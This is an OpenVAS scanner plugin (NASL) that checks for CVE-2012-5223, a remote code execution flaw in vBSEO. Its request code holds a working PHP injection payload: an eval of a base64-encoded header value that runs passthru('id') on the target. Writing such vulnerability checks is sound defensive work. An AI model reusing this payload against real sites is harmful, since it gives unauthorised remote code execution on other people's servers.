###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_vbseo_51647.nasl 9352 2018-04-06 07:13:02Z cfischer $
#
# vBSEO 'proc_deutf()' Remote Code Execution Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "vBSEO is prone to a remote code-execution vulnerability.

Exploiting this issue will allow attackers to execute arbitrary code
within the context of the affected application.

vBSEO 3.5.0, 3.5.1, 3.5.2, and 3.6.0.are vulnerable; other versions
may also be affected.";

tag_solution = "Updates are available. Please see the references for more details.";

if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.103405");
 script_cve_id("CVE-2012-5223");
 script_bugtraq_id(51647);
 script_version ("$Revision: 9352 $");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

 script_name("vBSEO 'proc_deutf()' Remote Code Execution Vulnerability");

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/51647");
 script_xref(name : "URL" , value : "http://www.vbseo.com/f5/vbseo-security-bulletin-all-supported-versions-patch-release-52783/");
 script_xref(name : "URL" , value : "http://www.vbseo.com/");

 script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:13:02 +0200 (Fri, 06 Apr 2018) $");
 script_tag(name:"creation_date", value:"2012-01-31 14:44:01 +0100 (Tue, 31 Jan 2012)");
 script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
 script_dependencies("vbulletin_detect.nasl");
 script_require_ports("Services/www", 80);
 script_mandatory_keys("vBulletin/installed");
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("version_func.inc");
include("misc_func.inc");
   
port = get_http_port(default:80);
if(!can_host_php(port:port))exit(0);

if(! dir = get_dir_from_kb(port:port, app:"vBulletin"))exit(0);
url = string(dir, "/vbseocp.php"); 

cmd = base64(str:'passthru("id");');
ex = "char_repl='{${eval(base64_decode($_SERVER[HTTP_CODE]))}}.{${die()}}'=>";
len = strlen(ex);

host = get_host_name();

req = string("POST ", url, " HTTP/1.1\r\n",
             "Host: ", host, "\r\n",
             "Code: ", cmd, "\r\n",
             "Content-Type: application/x-www-form-urlencoded\r\n",
             "Content-Length: ", len, "\r\n",
             "\r\n",
             ex);

result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

if(result && egrep(pattern:"uid=[0-9]+.*gid=[0-9]+.*",string:result)) {

  security_message(port:port);
  exit(0);

}  

exit(0);

